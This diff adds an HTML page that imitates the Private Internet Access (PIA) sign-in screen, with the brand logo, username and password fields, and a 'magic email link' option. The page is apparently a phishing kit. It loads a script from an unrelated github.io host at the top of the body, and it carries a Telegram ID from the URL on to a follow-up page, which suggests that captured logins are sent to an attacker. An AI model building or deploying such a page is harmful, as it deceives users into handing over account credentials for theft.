@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PIA Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:#2f3440;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:420px;
+  padding:35px 20px;
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  margin-bottom:20px;
+}
+
+.logo img{
+  width:35px;
+}
+
+.logo span{
+  font-size:32px;
+  font-weight:bold;
+}
+
+/* TITLE */
+h2{
+  font-size:22px;
+  margin-bottom:35px;
+  font-weight:500;
+}
+
+/* INPUT BOX */
+.input-box{
+  width:100%;
+  border:2px solid #9aa0aa;
+  border-radius:14px;
+  padding:18px 14px;
+  margin-bottom:20px;
+  text-align:left;
+}
+
+.input-box span{
+  position:relative;
+  top:-12px;
+  background:#2f3440;
+  padding:0 8px;
+  font-size:14px;
+  color:#c9cdd3;
+}
+
+.input-box input{
+  width:100%;
+  background:transparent;
+  border:none;
+  outline:none;
+  font-size:18px;
+  color:#fff;
+}
+
+/* LOGIN BUTTON */
+button{
+  width:100%;
+  padding:18px;
+  border:none;
+  border-radius:16px;
+  font-size:18px;
+  font-weight:bold;
+  margin-top:10px;
+  background:#7a7d85;
+  color:#222;
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+button.active{
+  background:#5ee05e;
+  color:#111;
+  cursor:pointer;
+}
+
+/* LINKS */
+.links{
+  margin-top:35px;
+  font-size:18px;
+  line-height:38px;
+}
+
+.links a{
+  color:#5ee05e;
+  text-decoration:none;
+  font-weight:500;
+}
+
+/* EMPTY SPACE BELOW */
+.space{
+  height:200px;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="container">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/private-internet-access.webp" style="width:20px;">
+    <span>PIA</span>
+  </div>
+
+  <!-- TITLE -->
+  <h2>Sign in to your account</h2>
+<form>
+  <!-- USERNAME -->
+  <div class="input-box">
+    <input type="text" id="username" name="usernane" placeholder="Enter username" name="username or Email">
+  </div>
+
+  <!-- PASSWORD -->
+  <div class="input-box">
+    <input type="password" id="password" placeholder="Enter password" name="password">
+  </div>
+
+  <!-- LOGIN BUTTON -->
+  <button id="loginBtn" disabled type="submit">LOGIN</button>
+</form>
+  <!-- LINKS -->
+  <div class="links">
+    <a href="#">LOGIN USING PURCHASE RECEIPT</a><br>
+<a href="li.html" id="magicLink">LOGIN USING MAGIC EMAIL LINK</a>
+  </div>
+
+  <div class="space"></div>
+</div>
+
+<script>
+const username = document.getElementById("username");
+const password = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+
+function checkInputs(){
+  if(username.value.trim() !== "" && password.value.trim() !== ""){
+    loginBtn.disabled = false;
+    loginBtn.classList.add("active");
+  }else{
+    loginBtn.disabled = true;
+    loginBtn.classList.remove("active");
+  }
+}
+
+username.addEventListener("input", checkInputs);
+password.addEventListener("input", checkInputs);
+</script>
+<script>
+  const link = document.getElementById("magicLink");
+
+  // Get current URL params
+  const params = new URLSearchParams(window.location.search);
+  const telegramId = params.get("id");
+
+  // If ID exists, attach it to next page link
+  if (telegramId) {
+    link.href = "li.html?id=" + telegramId;
+  }
+</script>
+</body>
+</html>
